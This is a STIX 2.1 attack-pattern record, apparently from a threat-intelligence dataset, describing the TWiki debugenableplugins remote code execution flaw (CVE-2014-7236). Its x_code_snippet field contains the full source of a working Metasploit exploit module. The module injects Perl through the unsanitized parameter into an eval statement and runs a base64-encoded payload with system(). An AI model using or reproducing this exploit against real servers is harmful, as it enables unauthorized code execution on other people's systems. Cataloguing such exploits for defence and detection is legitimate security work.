{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--33bb4029-0592-42e0-92e6-10bb025d3cf6",
    "created": "2024-08-14T17:14:54.303517Z",
    "modified": "2024-08-14T17:14:54.303521Z",
    "name": "TWiki Debugenableplugins Remote Code Execution",
    "description": " TWiki 4.0.x-6.0.0  contains a vulnerability in the Debug functionality. The value of the debugenableplugins parameter is used without proper sanitization in an Perl eval statement which allows remote code execution. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/http/twiki_debug_plugins.rb",
            "external_id": "twiki_debug_plugins.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-7236"
        },
        {
            "source_name": "reference",
            "url": "http://twiki.org/cgi-bin/view/Codev/SecurityAlert-CVE-2014-7236"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'TWiki Debugenableplugins Remote Code Execution',\n      'Description' => %q{\n        TWiki 4.0.x-6.0.0  contains a vulnerability in the Debug functionality.\n        The value of the debugenableplugins parameter is used without proper sanitization\n        in an Perl eval statement which allows remote code execution.\n      },\n      'Author' =>\n        [\n          'Netanel Rubin', # from Check Point - Discovery\n          'h0ng10', # Metasploit Module\n\n        ],\n      'License' => MSF_LICENSE,\n      'References' =>\n        [\n          [ 'CVE', '2014-7236'],\n          [ 'OSVDB', '112977'],\n          [ 'URL', 'http://twiki.org/cgi-bin/view/Codev/SecurityAlert-CVE-2014-7236']\n        ],\n      'Privileged' => false,\n      'Targets' =>\n        [\n          [ 'Automatic',\n            {\n              'Payload'        =>\n                {\n                  'BadChars' => \"\",\n                  'Compat'      =>\n                    {\n                      'PayloadType' => 'cmd',\n                      'RequiredCmd' => 'generic perl python php',\n                    }\n                },\n              'Platform' => ['unix'],\n              'Arch' => ARCH_CMD\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2014-10-09'))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, \"TWiki path\", '/do/view/Main/WebHome' ]),\n        OptString.new('PLUGIN', [true, \"A existing TWiki Plugin\", 'BackupRestorePlugin'])\n      ])\n  end\n\n\n  def send_code(perl_code)\n    uri = target_uri.path\n    data = \"debugenableplugins=#{datastore['PLUGIN']}%3b\" + CGI.escape(perl_code) + \"%3bexit\"\n\n    res = send_request_cgi!({\n      'method' => 'POST',\n      'uri' => uri,\n      'data' => data\n    })\n\n    return res\n  end\n\n\n  def check\n    rand_1 = rand_text_alpha(5)\n    rand_2 = rand_text_alpha(5)\n\n    code = \"print(\\\"Content-Type:text/html\\\\r\\\\n\\\\r\\\\n#{rand_1}\\\".\\\"#{rand_2}\\\")\"\n    res = send_code(code)\n\n    if res and res.code == 200\n      return CheckCode::Vulnerable if res.body == rand_1 + rand_2\n    end\n    CheckCode::Unknown\n  end\n\n\n  def exploit\n    code = \"print(\\\"Content-Type:text/html\\\\r\\\\n\\\\r\\\\n\\\");\"\n    code += \"require('MIME/Base64.pm');MIME::Base64->import();\"\n    code += \"system(decode_base64('#{Rex::Text.encode_base64(payload.encoded)}'));exit\"\n    res = send_code(code)\n    handler\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-10-09",
    "x_mitre_platforms": [
        "['unix']"
    ]
}